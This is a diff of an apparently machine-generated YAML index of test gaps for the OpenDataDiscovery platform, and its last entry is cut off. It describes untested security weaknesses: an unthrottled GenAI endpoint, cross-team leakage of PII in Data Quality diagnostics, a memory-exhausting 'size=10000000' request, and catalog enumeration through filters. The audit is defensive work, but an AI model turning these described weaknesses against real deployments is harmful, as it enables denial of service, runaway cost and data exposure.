@@ -7,19 +7,19 @@ source_monolith_frontmatter:
   sidecar_count: 65
   test_files_indexed: 70
   prompt_version: test-coverage-mapper/0.1.0
-  total_test_gaps: 972
+  total_test_gaps: 990
   gaps_by_criticality:
-    CRITICAL: 161
-    HIGH: 321
-    MEDIUM: 365
+    CRITICAL: 164
+    HIGH: 332
+    MEDIUM: 369
     LOW: 125
   gaps_by_category:
-    missing-integration: 198
-    missing-security: 270
-    missing-edge-case: 308
+    missing-integration: 204
+    missing-security: 275
+    missing-edge-case: 314
     missing-unit: 90
     sidecar-stale: 3
-    missing-performance: 35
+    missing-performance: 36
     missing-binding: 10
     integration: 34
     unit: 6
@@ -214,7 +214,7 @@ source_monolith_frontmatter:
   - odd-platform java notification.sender class:SlackNotificationSender
   - odd-platform java notification.sender class:WebhookNotificationSender
   - odd-platform java notification.processor class:PostgresWALMessageProcessor
-total_entries: 972
+total_entries: 990
 notice: Rebuilt from detail/ by lineage/_extractor/registry-shard/rebuild_indexes.py.
   The detail files are the source of truth; this index is derived headlines for the
   registry-search subagent.
@@ -29948,3 +29948,980 @@ test_gaps_index:
   related_refactor_ids: []
   related_doc_gap_ids: []
   detail_path: detail/TEST-GAP-975.yaml
+- gap_id: TEST-GAP-976
+  behaviour: '**GenAI endpoint has NO rate limit, NO per-user quota, NO max-concurrent-requests
+    cap — denial-of-service AND unbounded-cost surface.** `POST /api/genai/ask` accepts
+    requests as fast as any authenticated principal can submit them (any logged-in
+    user under LOGIN_FORM/OAUTH2/LDAP, or any anonymous caller under DISABLED). Combined
+    with the absence of `@Size` on `GenAIRequest.body` (only the implicit `spring.codec.max-in-memory-size:
+    20MB` ceiling at `application.yml:15`), this is BOTH:
+
+
+    - **DoS surface**: a single user (or a worm in the network under DISABLED) can
+    submit a flood of 20MB prompts, exhausting Reactor Netty''s event-loop and upstream
+    LLM service connection pool.
+
+    - **Unbounded-cost surface**: the operator''s external LLM bills per-token; the
+    platform forwards every request verbatim with no spend-cap, no per-user quota,
+    no audit accounting. A malicious or buggy script can burn through the operator''s
+    LLM budget in hours.
+
+
+    No test asserts this posture. The current state is intentional (the live doc states
+    "deploy behind a network policy / mesh / ingress that authenticates / restricts
+    callers") but the platform offers NO defense-in-depth — a missed network policy
+    at the deployment layer leaves the GenAI surface unprotected.
+
+
+    **Distinct from existing TEST-GAP-037** (which pins unbounded prompt-body SIZE).
+    This gap pins unbounded REQUEST FREQUENCY + unbounded COST. A test pinning rate-limit
+    posture would also serve as a guardrail when a future hardening (e.g. `@RateLimit`
+    annotation, per-user counter in Micrometer) lands.'
+  test_class: missing-security
+  criticality: HIGH
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-976.yaml
+- gap_id: TEST-GAP-977
+  behaviour: '**No audit log of GenAI prompts or responses — abuse investigation,
+    PII leak forensics, and compliance reporting are impossible at the platform tier.**
+    The controller has no `@Slf4j` annotation and no log calls (`GenAIController.java:1-24`);
+    `GenAIServiceImpl.java:19`''s `@Slf4j` annotation is present but its `log` instance
+    is unreferenced in the visible 53 lines (no `log.info` / `log.warn` / `log.error`
+    calls). An operator investigating:
+
+
+    - **Prompt-injection abuse**: which user submitted the malicious system-prompt-overlay
+    attempt that broke the upstream LLM into leaking another tenant''s data?
+
+    - **PII exfiltration through prompts**: which user submitted a dataset extract
+    as a prompt body, leaking GDPR-protected data to the external LLM operator?
+
+    - **Spend anomaly**: who burned through the LLM budget last weekend?
+
+    - **Compliance**: who has accessed the LLM service today (SOC 2 access-log requirement)?
+
+
+    ...has NO platform-side trail. The only audit trail is at the external LLM service
+    (which the platform operator may not control) plus the network layer (which captures
+    URLs not bodies for HTTPS traffic).
+
+
+    **Distinct from TEST-GAP-039** (which pins prompt-injection / SSRF posture at
+    request-time). This gap pins POST-incident-forensics posture — even if no defense
+    exists, an audit log enables retrospective investigation and credible compliance
+    reporting. Combined with TEST-GAP-976 (no rate limit), the platform offers NEITHER
+    prevention NOR detection of LLM abuse.
+
+
+    The live GenAI doc page acknowledges this gap implicitly (no logging language
+    in the operator-facing guidance); explicitly surfacing it as a test gap pins the
+    current posture and converts future audit-log instrumentation into a deliberate
+    test update.'
+  test_class: missing-security
+  criticality: HIGH
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-977.yaml
+- gap_id: TEST-GAP-978
+  behaviour: '**`DataEntityRunController` has ZERO HTTP-tier test coverage** — the
+    controller is the entry point for the per-DQ-test / per-transformer `/history`
+    UI tab (`TestRunsHistory.tsx:24-122`) plus the test-report-details first-10-runs
+    preview (`TestReportDetailsHistory.tsx:30-32`) plus any third-party API consumer
+    hitting `GET /api/dataentities/{data_entity_id}/runs`. The repository tier IS
+    covered (`DataEntityRunRepositoryImplTest.java:34-93` exercises ordering, pagination,
+    status filter at the SQL layer), but the controller HTTP boundary is unverified.
+
+
+    **Uncovered HTTP paths**:
+
+    - **404 path**: `dataEntityRepository.get(dataEntityId).switchIfEmpty(NotFoundException("Data
+    entity", id))` (`DataEntityRunServiceImpl.java:32-34`) — never asserted at the
+    wire.
+
+    - **400 path**: entity-class gate at `DataEntityRunServiceImpl.java:35-44` throws
+    `BadUserRequestException("Data entity with id %d is not supposed to have runs
+    due to its class")` when the entity is neither DATA_TRANSFORMER (id 2) nor DATA_QUALITY_TEST
+    (id 4) — never asserted at the wire.
+
+    - **200-with-empty-list path**: a transformer / DQ-test with zero historical runs
+    returns `DataEntityRunList{items:[], pageInfo:{total:0, hasNext:false}}` — never
+    asserted at the wire.
+
+    - **Wire-enum unmarshal failure path** (P-151 hypothesis): a result set containing
+    a RUNNING row triggers MapStruct''s `Enum.valueOf()` `IllegalArgumentException`
+    → HTTP 500 → page UNAVAILABLE during in-flight tests (see TEST-GAP-979 for the
+    pinned version).
+
+    - **Mapper output shape**: every row''s `statusReason` is rendered verbatim from
+    `data_entity_task_run.status_reason` — the controller''s content-negotiation,
+    Jackson serialisation of `OffsetDateTime` fields, and the wire-enum mapping are
+    all unverified.
+
+
+    A regression in: WebFlux routing, OpenAPI-generated `@RequestParam` deserialisation
+    of the `status` query param, the `Mono.map(ResponseEntity::ok)` composition, content-negotiation,
+    Jackson serialisation of the nested envelope — would silently break the `/history`
+    UI tab with the build still green.'
+  test_class: missing-integration
+  criticality: HIGH
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-978.yaml
+- gap_id: TEST-GAP-979
+  behaviour: '**The `/history` UI tab returns HTTP 500 — silently UNAVAILABLE — exactly
+    while a Data Quality test is in flight, because the wire enum `DataEntityRunStatus`
+    (6 values) is missing the `RUNNING` literal that the DB column `data_entity_task_run.status`
+    carries (7-value `IngestionTaskRunStatus` per `IngestionTaskRun.java:28-36`).**
+    When `getDataEntityRuns(...)` returns a result set containing ANY row with `status=''RUNNING''`,
+    the `DataEntityRunMapper.java:13-14` flat-maps the String → wire enum target;
+    MapStruct''s String-to-enum conversion strategy uses `Enum.valueOf()` which throws
+    `IllegalArgumentException` on unknown literals. Without an `@onError` fallback
+    at the mapper level or a `.onErrorResume` at the controller layer, the exception
+    propagates to the global `ControllerAdvice` and becomes HTTP 500.
+
+
+    **Operator-visible failure**: the moment an operator MOST wants to see the run-history
+    page (to monitor an in-flight test) is exactly when the page breaks. The UI displays
+    "Something went wrong" with no path forward; the operator has no signal that the
+    failure is correlated with the in-flight status, no workaround documented, no
+    graceful degradation. Once the in-flight test completes (status transitions to
+    SUCCESS/FAILED/etc.), the page magically works again — a Heisenbug from the operator''s
+    perspective.
+
+
+    **NULL end_time compounds**: a RUNNING task has `end_time=NULL`; Postgres default
+    for `ORDER BY end_time DESC` is NULLS FIRST (`ReactiveDataEntityTaskRunRepositoryImpl.java:178`
+    — no `NULLS FIRST/LAST` directive), so RUNNING rows appear AT THE TOP of the result
+    set — guaranteeing the failure case fires on EVERY request during an in-flight
+    test.
+
+
+    **Why this is the worst kind of test gap**: pure repository-tier testing CANNOT
+    catch this — the SQL is correct; the bug is at the SQL→Java mapper boundary. Pure
+    unit testing of `DataEntityRunMapper` would catch it ONLY if the test deliberately
+    constructs a Pojo with `status=''RUNNING''`. The current `DataEntityRunRepositoryImplTest.java:34-93`
+    does seed a RUNNING row (line 50) but only tests `paginate(...)` not `getDataEntityRuns(...)`
+    — the mapper boundary is never exercised on RUNNING input.'
+  test_class: missing-edge-case
+  criticality: HIGH
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-979.yaml
+- gap_id: TEST-GAP-980
+  behaviour: "**`status_reason` PII broadcast across owner boundaries — any authenticated\
+    \ user on the platform can enumerate every Data Quality test's diagnostic stream\
+    \ regardless of which team owns the dataset.** The endpoint is NOT listed in `SecurityConstants.SECURITY_RULES`\
+    \ (verified by grep over SecurityConstants.java:98-355 returning zero matches\
+    \ for `/runs`); the path falls through to `AuthorizationCustomizer.java:29-30`\
+    \ `.pathMatchers(\"/**\").authenticated()`. No owner predicate exists at the SQL\
+    \ layer (`ReactiveDataEntityTaskRunRepositoryImpl.java:161-191` — every WHERE\
+    \ clause is derived from request params, not principal-derived).\n\n**What leaks**:\n\
+    - **Test execution timeline**: the full history of when DQ tests run, succeed,\
+    \ fail across every dataset in the catalog — useful for enumerating which teams\
+    \ have failing pipelines, monitoring schedules, and operational cadence across\
+    \ owner boundaries.\n- **`status_reason` free-form text**: this is the diagnostic\
+    \ field set by the test framework. Common content:\n  - **Great Expectations**:\
+    \ failed-row sample values (column names + actual cell values that violated the\
+    \ expectation — directly PII if the violated column is `email`, `phone_number`,\
+    \ `ssn`, `customer_address`).\n  - **dbt tests**: failing SQL query text + sample\
+    \ rows from the failure (same PII vector).\n  - **Custom frameworks**: free-form\
+    \ operator-supplied diagnostics that may include internal table/column names,\
+    \ query snippets, or pasted-in error logs containing customer IDs.\n\n**Why CRITICAL\
+    \ not HIGH**:\n- **PII regulatory exposure**: A GDPR-bound operator deploying\
+    \ ODD with a Great Expectations check that fails on PII-bearing columns will leak\
+    \ that PII to every authenticated user on the platform — including users whose\
+    \ own teams have no business with the failing dataset. This is a DPA-violation\
+    \ surface that the live data-quality doc does NOT flag.\n- **Compound with TEST-GAP-979**:\
+    \ even if RUNNING-row 500-bug doesn't fire (operator catches the runs page during\
+    \ a non-RUNNING moment), the security leak persists across every successful page-load.\n\
+    - **Cross-pillar amplification**: P-04 (Data Quality) × P-09 (Security) — a maintainer\
+    \ auditing P-04 alone misses the security half; a maintainer auditing P-09 alone\
+    \ misses the operationally-realistic failure mode.\n\nNo test pins this. A pure\
+    \ security-class test fixing the assertion (\"bob can read alice's DQ run history\
+    \ with status_reason\") locks the current posture; future hardening (add owner\
+    \ predicate at SQL OR add `@PreAuthorize` at controller OR add a redaction filter\
+    \ on `status_reason`) inverts the assertion deliberately."
+  test_class: missing-security
+  criticality: CRITICAL
+  node_id: ''
+  feature_id: F-022
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-980.yaml
+- gap_id: TEST-GAP-981
+  behaviour: '**`GET /api/dataentities/{id}/runs?size=10000000` is accepted verbatim
+    — DoS surface via single-request memory exhaustion.** The OpenAPI `SizeParam`
+    (`components.yaml:4222-4229`) declares int32 with NO `minimum`/`maximum` constraint;
+    the controller''s `Integer size` parameter is passed through verbatim to the SQL
+    `LIMIT` (`ReactiveDataEntityTaskRunRepositoryImpl.java:180-181`); no bounds-check
+    at controller / service / repository / mapper layers. A request with `size=10000000`
+    will:
+
+
+    - Issue `SELECT ... FROM data_entity_task_run JOIN ... LIMIT 10000000` to PostgreSQL
+    — the window-function-based paginate plan (count(*) over() + row_number() over(orderBy)
+    per `JooqQueryHelper.java:73-83`) is O(N) on the materialised result set.
+
+    - Materialise up to 10M rows in the API tier through JOOQ result mapping + MapStruct
+    conversion + Jackson serialisation.
+
+    - Hold one Postgres connection from the reactive pool for the duration.
+
+    - Block the response thread for serialisation of a multi-GB JSON payload.
+
+
+    Practical impact: a single curl request can wedge an API instance''s reactive
+    event loop for tens of seconds; sustained traffic from a buggy script or malicious
+    user OOMs the API tier. The endpoint sits BEHIND `.authenticated()` only (no rate-limit,
+    no per-user quota), making the DoS surface available to any authenticated user
+    including under `auth.type=DISABLED` (anonymous).
+
+
+    No test asserts a server-side cap. The UI''s well-behaved size=100 (TestRunsHistory.tsx:27)
+    and size=10 (TestReportDetailsHistory.tsx:31) defaults DO NOT defend against direct
+    API consumers or a future UI refactor that increases the cap.'
+  test_class: missing-performance
+  criticality: MEDIUM
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-981.yaml
+- gap_id: TEST-GAP-982
+  behaviour: '**The runs-history UI displays an inconsistent / non-deterministic ordering
+    at the page boundary when (a) NULL end_time RUNNING rows mix with completed runs,
+    or (b) multiple completed runs share an end_time value.** The SQL emits `ORDER
+    BY end_time DESC` (single field, no tie-breaker, no NULLS-FIRST/LAST directive
+    — `ReactiveDataEntityTaskRunRepositoryImpl.java:178` + `JooqQueryHelper.java:74-89`).
+    Two operator-visible failure modes:
+
+
+    **(a) NULL end_time positioning** — Postgres default for DESC is NULLS FIRST,
+    so RUNNING tasks (end_time=NULL) appear AT THE TOP of the runs list. The UI labels
+    each row by `startTime` in the leftmost column (`TestRunItem.tsx:30`) with an
+    empty Duration column when endTime is null (`TestRunItem.tsx:53-57`); the operator
+    sees an undated-looking row first with no visual signal that it represents an
+    in-flight test. Combined with TEST-GAP-979 (the RUNNING-enum-mapper failure),
+    this is the trigger condition: a RUNNING row at position [0] in the result set
+    fires the IllegalArgumentException at the mapper.
+
+
+    **(b) Tied end_time across page boundaries** — InfiniteScroll consumer (TestRunsHistory.tsx:90-113)
+    appends successive pages via independent SQL invocations (each fetch issues its
+    own `LIMIT OFFSET` query). If two completed runs share an end_time AND span the
+    page boundary (page 1 ends at index 100, page 2 starts at index 100; rows 99-101
+    share end_time), the Postgres physical-storage order may differ across fetches
+    — operator sees the same row twice (duplicated across pages) OR sees rows skipped
+    (one row never appears in either page).
+
+
+    **Compound with display key mismatch** — the UI''s leftmost column is `startTime`
+    (`TestRunsHistory.tsx:74-87`); the SQL sort is `end_time DESC`. For long-running
+    tests the two diverge: a run started YESTERDAY but ended TODAY appears ABOVE a
+    run started AND ended earlier today. The operator''s mental model "this list is
+    sorted by what I see in the first column" is wrong.
+
+
+    No test asserts ordering under (a) or (b). The repository test (`DataEntityRunRepositoryImplTest.java:62`)
+    uses `DataEntityTaskRunPojoEndTimeComparator` to compute the EXPECTED order —
+    but only for completed runs with distinct end_times; the NULL and tied cases are
+    uncovered.'
+  test_class: missing-edge-case
+  criticality: MEDIUM
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-982.yaml
+- gap_id: TEST-GAP-983
+  behaviour: '**`DataQualityRunsController` has ZERO HTTP-tier test coverage** — the
+    controller is the SOLE backing endpoint of the catalog-wide Data Quality Dashboard
+    (pillar P-04:F-002, the `/data-quality` UI route). Repository-tier tests exist
+    but cover only 2 of 3 sub-queries (`ReactiveDataQualityRunsRepositoryTest.java:91-119`
+    exercises `getLatestDataQualityRunsResults` + `getMonitoredTables` only — `getLatestTablesHealth`
+    is uncovered, see TEST-GAP-985). Service tier, controller tier, and HTTP boundary
+    are entirely unverified.
+
+
+    **What''s at risk**:
+
+    - **WebFlux routing** of `GET /api/dataqatests/runs` to `DataQualityRunsController.getDataQualityTestsRuns`
+    (`DataQualityRunsController.java:18-33`).
+
+    - **OpenAPI-generated `@RequestParam` deserialisation of 10 `List<Long>` arrays**
+    (`namespaceIds | datasourceIds | ownerIds | titleIds | tagIds` + 5 `de*` siblings
+    — `openapi.yaml:1979-2078`). A regression in the generator template, the Spring
+    `?ids=1,2,3` vs `?ids=1&ids=2&ids=3` convention, OR the int-vs-long boundary at
+    the wire would silently break filter behaviour.
+
+    - **Three-way `Mono.zipWith` composition** (`DataQualityRunsServiceImpl.java:36-39`)
+    — fan-out + collect-list dance is correctness-critical; a regression that drops
+    a slice or returns null inside the envelope is invisible at the build layer.
+
+    - **Jackson serialisation of the nested envelope** (`DataQualityResults{testResults:[...],
+    tablesDashboard:{...}}` — `components.yaml:3748-3800`).
+
+    - **Mapper padding** (`DataQualityCategoryMapperImpl.java:24-30, 45-60`) — the
+    always-36-cells contract; a regression that strips zero-count cells would break
+    UI rendering invariants.
+
+
+    Combined with TEST-GAP-984 (the LSN-019 test-vs-run drift) and TEST-GAP-985 (table-health
+    zero coverage), the dashboard''s CRITICAL slice has both a semantic-drift bug
+    AND zero defensive coverage. A maintainer refactoring `Mono.zipWith` to a single
+    bulk SQL would have no test catching the regression.'
+  test_class: missing-integration
+  criticality: HIGH
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-983.yaml
+- gap_id: TEST-GAP-984
+  behaviour: '**The Quality Dashboard''s "Test Results Breakdown" ring lies — it shows
+    TEST counts (one per test) keyed on latest-run-status, NOT RUN counts as both
+    the operation name and the live documentation promise.** This is an LSN-019-class
+    drift instantiated on the highest-visibility surface of P-04: every operator triaging
+    the catalog-wide dashboard reads a count expecting "run volume by status" and
+    gets "test count by their most recent run''s status".
+
+
+    **The semantic drift in detail**:
+
+    - The OpenAPI operation summary reads "Get Data Quality tests runs" (`openapi.yaml:1975-1976`).
+
+    - The UI title chart label says "Test Results Breakdown" (`DataQualityContent.tsx:110`).
+
+    - The live doc at `https://docs.opendatadiscovery.org/features/data-quality/dashboard`
+    says verbatim: **"Test Results Breakdown — the count of test runs broken down
+    by status (passed / failed / skipped)"** (WebFetched 2026-05-25, status 200).
+
+    - The implementation joins `DATA_ENTITY_TASK_LAST_RUN` (`ReactiveDataQualityRunsRepositoryImpl.java:76,
+    95`), whose `task_oddrn` is `PRIMARY KEY` (`V0_0_45__last_runs_table.sql:9`) —
+    exactly one row per test.
+
+
+    **Concrete consequence**:
+
+    - A test that ran 100 times (99 SUCCESS, 1 latest FAILED) contributes 1 to the
+    FAILED bucket — NOT 99/1 split.
+
+    - A test that flapped 50/50 over its history but most recently succeeded contributes
+    1 to SUCCESS — the dashboard cannot distinguish "stable test" from "transient
+    flap".
+
+    - A test that succeeded for years and just started failing shows as 1 FAILED —
+    eclipsing the long success history.
+
+    - An operator reading the FAILED count assumes "N tests are failing right now";
+    the count actually says "N tests had their most recent run fail at some point"
+    — which COULD include tests that fail intermittently and are currently green at
+    the last refresh.
+
+
+    **Why CRITICAL**:
+
+    - **Operational mis-decision-making**: triagers prioritise based on this count;
+    the count''s meaning disagrees with the operator''s mental model formed from the
+    label + doc.
+
+    - **Drift-prone**: a future maintainer "fixing" the SQL to count rows from `DATA_ENTITY_TASK_RUN`
+    would silently triple/100x the counts on the dashboard — and arguably MATCH the
+    documented contract. There is no test pinning the current denormalised behaviour,
+    so the bug-fix-or-bug-pin ambiguity is unresolved.
+
+    - **Compound with TEST-GAP-986**: the denormalisation invariant (single-row-per-task)
+    is the load-bearing assumption — a schema change reverting the denormalisation
+    would silently flip the dashboard''s meaning.
+
+    - **LSN-019 family**: this is the canonical instantiation of "operationId name
+    vs implementation behaviour" drift on the highest-traffic dashboard endpoint.'
+  test_class: missing-integration
+  criticality: CRITICAL
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-984.yaml
+- gap_id: TEST-GAP-985
+  behaviour: '**`getLatestTablesHealth` — one of THREE sub-queries the dashboard fans
+    out to — has ZERO test coverage at any tier.** The existing `ReactiveDataQualityRunsRepositoryTest.java:91-119`
+    covers `getLatestDataQualityRunsResults` (line 91-99) and `getMonitoredTables`
+    (line 101-119); the THIRD method `getLatestTablesHealth` (`ReactiveDataQualityRunsRepositoryImpl.java:108-173`)
+    has NO test method asserting its 3-way classification CTE algebra.
+
+
+    **What''s at risk**:
+
+    - **HEALTHY classification**: `NOT EXISTS last_run WHERE STATUS != SUCCESS` (`ReactiveDataQualityRunsRepositoryImpl.java:118-124`).
+    A dataset is healthy iff EVERY one of its DQ tests has a latest run with status=SUCCESS.
+
+    - **ERROR classification**: `EXISTS last_run with STATUS in {BROKEN, FAILED}`
+    AND NOT in healthy (`ReactiveDataQualityRunsRepositoryImpl.java:127-146`).
+
+    - **WARNING classification**: fallthrough — NOT IN healthy AND NOT IN error (`ReactiveDataQualityRunsRepositoryImpl.java:148-157`).
+    Typical case: a dataset with latest-runs including SKIPPED / ABORTED / UNKNOWN
+    but no BROKEN / FAILED.
+
+    - **Mutually exclusive + exhaustive**: every dataset with at least one DQ test
+    falls into exactly one bucket per the CTE algebra. Datasets with NO DQ tests are
+    absent from all three (a separate concept — they''re counted in `notMonitoredTables`
+    instead).
+
+
+    **Operator-visible failure modes if the SQL drifts**:
+
+    - A subtle classification gap (per sidecar `bugs_limitations_corner_cases[6]`):
+    a dataset with 10 tests where 9 latest-runs are SUCCESS and 1 is SKIPPED is classified
+    WARNING (because SKIPPED != SUCCESS), not HEALTHY. The operator''s mental model
+    "SKIPPED is benign" misaligns with the SQL''s "anything not SUCCESS = not healthy".
+
+    - The UNION ALL collapse: `UNION ALL` (not `UNION`) is the join across the 3 CTEs;
+    if the CTE predicates accidentally overlap (e.g. a future bug at line 130-145
+    lets WARNING and ERROR co-classify the same dataset), the table-health ring''s
+    slice cardinality breaks. No test pins the mutual-exclusivity.
+
+
+    **Compound with doc-drift**: the live `https://docs.opendatadiscovery.org/features/data-quality/dashboard`
+    page enumerates the three states but provides NO rules — operators cannot predict
+    which colour their dataset renders. Pinning the CTE algebra in tests is the operator-trust
+    substrate the doc currently lacks.
+
+
+    No test asserts ANY of the above. A maintainer refactoring the CTE chain has no
+    regression coverage to catch a classification flip. The sidecar''s `name_behavior_pairs.[2]`
+    records the lexicon drift (doc says "success / failed / broken"; UI says "healthy
+    / warning / error"; SQL constants say `GOOD_HEALTH / WARNING / ERROR`) — three
+    lexicons compound the test gap.'
+  test_class: missing-integration
+  criticality: HIGH
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-985.yaml
+- gap_id: TEST-GAP-986
+  behaviour: '**The load-bearing denormalisation invariant — `DATA_ENTITY_TASK_LAST_RUN.task_oddrn`
+    is `PRIMARY KEY` (single row per test) — has NO test pinning it.** This is the
+    schema invariant on which the dashboard''s entire semantic rests:
+
+
+    - The dashboard joins `DATA_ENTITY_TASK_LAST_RUN` (`ReactiveDataQualityRunsRepositoryImpl.java:41,
+    76, 95, 117-141`) — the denormalised "latest run per test" table populated by
+    the ingestion path (`V0_0_45__last_runs_table.sql:7-25`).
+
+    - `task_oddrn` is `PRIMARY KEY` (`V0_0_45__last_runs_table.sql:9`) — exactly one
+    row per test.
+
+    - The denormalisation IS the design — it changes the dashboard''s semantic from
+    "count of test runs by status" to "count of tests by their latest-run-status"
+    (the LSN-019 drift documented in TEST-GAP-984).
+
+
+    **Failure modes this gap enables**:
+
+
+    1. **Schema-change-without-code-change**: a future maintainer evolves `DATA_ENTITY_TASK_LAST_RUN`
+    (e.g. drops the PK to allow multi-row history; adds a "version" column for soft-mutation)
+    without updating `getLatestDataQualityRunsResults`. The COUNT in the dashboard
+    silently inflates by the number of rows per task. No test catches it.
+
+
+    2. **Code-change-without-schema-change**: a future maintainer thinks "the doc
+    says count of runs, the code should aggregate over `data_entity_task_run` directly"
+    and refactors the join. The dashboard COUNT inflates 100x in deployments with
+    long history. No test catches it.
+
+
+    3. **Migration backfill drift**: the `V0_0_45` migration back-fills via `DISTINCT
+    ON (tr.task_oddrn) ORDER BY tr.task_oddrn, tr.end_time DESC ... ON CONFLICT DO
+    UPDATE` (`V0_0_45__last_runs_table.sql:15-21`). A future migration that doesn''t
+    preserve the DISTINCT ON semantics would leave dual rows for some tasks. No test
+    pins this.
+
+
+    4. **Ingestion-write drift**: the ingestion pipeline''s `last_runs` upsert (`TaskRunIngestionRequestProcessor`
+    per IngestionService sidecar) is the SOLE writer of `DATA_ENTITY_TASK_LAST_RUN`.
+    A future ingestion refactor that lets two simultaneous writes succeed (race on
+    the upsert) would corrupt the PK invariant on Postgres versions that don''t enforce
+    strict serialisability under READ COMMITTED.
+
+
+    The denormalisation is the DESIGN — a deliberate ADR (`implicit_adrs[0]`). Test
+    coverage pinning it is the regression-pin that converts intentional design into
+    deliberate-test-update on future changes.'
+  test_class: missing-integration
+  criticality: HIGH
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-986.yaml
+- gap_id: TEST-GAP-987
+  behaviour: '**The catalog-wide Data Quality Dashboard returns full aggregate test
+    counts + table-health distribution + monitored-tables coverage to any authenticated
+    user — including users with no ownership association anywhere in the catalog.**
+    The endpoint sits behind `.pathMatchers("/**").authenticated()` only (`AuthorizationCustomizer.java:29-30`);
+    `SecurityConstants.SECURITY_RULES` (`SecurityConstants.java:98-355`) has NO entry
+    for `/api/dataqatests/runs` (grep verified 2026-05-25); the downstream SQL has
+    no owner predicate (`ReactiveDataQualityRunsRepositoryImpl.java:65-196` — every
+    condition is filter-derived, none principal-derived).
+
+
+    **What leaks**:
+
+    - **Catalog-wide test count distribution**: total tests by category × status —
+    useful for risk-assessment + competitive intelligence (which teams have heavy
+    DQ investment, which categories of anomaly are most common).
+
+    - **Table-health distribution**: how many tables are healthy / warning / error
+    platform-wide — operational quality signal across owner boundaries.
+
+    - **Monitored vs unmonitored coverage**: which fraction of TABLE-type entities
+    have ANY DQ test attached — exposes which teams have poor / no DQ practice.
+
+    - **Filter-dimension enumeration**: a 3rd-party API consumer can iterate namespaceIds/datasourceIds/ownerIds/titleIds/tagIds,
+    observing per-filter aggregate response — this is a META-information enumeration
+    vector: a caller can map the platform''s test infrastructure (which namespaces
+    have failing tests, which owners are responsible for unhealthy tables) without
+    ever reading a specific entity name.
+
+
+    **Compound with `auth.type=DISABLED`**: under DISABLED, the dashboard endpoint
+    is ANONYMOUSLY reachable. The full catalog-wide DQ aggregate leaks to anyone on
+    the network. DISABLED is documented as dev-only per the configuration-and-deployment
+    docs, but operators misconfiguring prod see catalog-wide DQ data publicly.
+
+
+    **Why HIGH**:
+
+    - **Intentional posture, undocumented**: the cross-owner-read posture is consistent
+    with the platform''s read-collaborative pillar (ADR-CANDIDATE-003 / REFACTOR-024)
+    — it''s a deliberate design choice. But the LIVE doc page (`https://docs.opendatadiscovery.org/features/data-quality/dashboard`)
+    is COMPLETELY SILENT on who can view the dashboard. Operator''s mental model doesn''t
+    align with platform reality — and the platform doesn''t help.
+
+    - **Enumeration vector**: even if the AGGREGATE counts are "harmless", the FILTER-API
+    combined with this endpoint becomes a catalog-mapping tool that bypasses per-entity
+    read gates.
+
+    - **Compound with TEST-GAP-980** (DataEntityRun status_reason PII broadcast):
+    the dashboard tells you WHERE the failing tests are (which owners / namespaces);
+    the runs endpoint tells you WHAT they say (status_reason PII). Together they form
+    a catalog-wide DQ diagnostic enumeration surface.
+
+
+    No test pins this — neither the posture (no test asserts the dashboard is reachable
+    by non-owner) nor the documentation drift (no test asserts the operator can opt
+    into restriction).'
+  test_class: missing-security
+  criticality: HIGH
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-987.yaml
+- gap_id: TEST-GAP-988
+  behaviour: '**`GET /api/datasets/{id}/structure` returns the `max(DATASET_VERSION.VERSION)`
+    row — NOT the `max(created_at)` row.** This is correct under normal monotonic
+    ingestion (the ingestion path at `DatasetStructureIngestionRequestProcessor.java:171-178`
+    increments `version.getVersion() + 1` per re-ingest, so highest-version IS the
+    most-recently-created). But the load-bearing assumption — monotonicity — has NO
+    test pinning it.
+
+
+    **When monotonicity breaks**:
+
+    - **Manual SQL fixup**: an operator running `UPDATE dataset_version SET created_at
+    = ... WHERE id = ...` to repair a backfill.
+
+    - **Replay**: re-ingestion of historical data that resets the version counter
+    (e.g. a migration from V1 of an ingestion adapter to V2 where versions reset).
+
+    - **Backfill**: bulk-loading historical structure snapshots that arrive with non-monotonic
+    timestamps.
+
+    - **Race in ingestion**: two concurrent ingestion paths writing to the same dataset_oddrn
+    — if version counter is read+incremented without serialisation, both writes could
+    land at the same `version` value (corruption — separate bug) OR one could land
+    at a higher version with an earlier created_at.
+
+
+    **Operator-visible failure mode**: An operator running a `terraform-odd-provider`-style
+    bulk import that manipulates `dataset_version` records directly may see "Latest"
+    returning the wrong row. The UI''s `DatasetStructureOverview` (TestRunsHistory.tsx
+    siblings) labels the displayed row "Latest" without surfacing the underlying ordering
+    key — the operator assumes most-recently-ingested.
+
+
+    **Why MEDIUM**:
+
+    - **Code path is correct under intended use** (monotonic ingestion); the ADR `"Dataset
+    structure versions are surfaced as a thin pass-through"` (`DatasetController.md:implicit_adrs.[0]`)
+    implicitly accepts the monotonicity assumption.
+
+    - **Doc-side**: the live schema-diff doc at `https://docs.opendatadiscovery.org/features/data-discovery/schema-diff`
+    does NOT define "latest". An operator running fixup work has no documentation
+    to refer to.
+
